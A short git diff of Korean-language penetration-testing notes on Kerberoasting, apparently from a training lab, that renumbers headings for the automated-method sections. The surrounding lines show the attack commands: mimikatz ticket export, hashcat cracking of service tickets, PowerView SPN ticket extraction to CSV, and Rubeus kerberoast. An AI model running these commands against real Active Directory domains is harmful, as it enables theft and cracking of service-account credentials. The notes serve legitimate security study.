@@ -458,7 +458,7 @@ mimikatz # kerberos::list /export
 ### Hashcat으로 Cracking
 ```hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt```
 
-### 2) 자동 방법
+### 2-1) 자동 방법
 
 ### TGS Tickets 추출을 위한 PowerView 사용
 ```
@@ -472,6 +472,8 @@ Get-DomainUser * -spn | select samaccountname
 ### 모든 Ticket을 CSV 파일로 내보내기
 ```Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation```<br/>
 ```cat .\ilfreight_tgs.csv```
+
+### 2-2) 자동 방법
 
 ### Rubeus 사용하여 통계 수집 (/stats 플래그)
 ```Rubeus.exe kerberoast /stats```
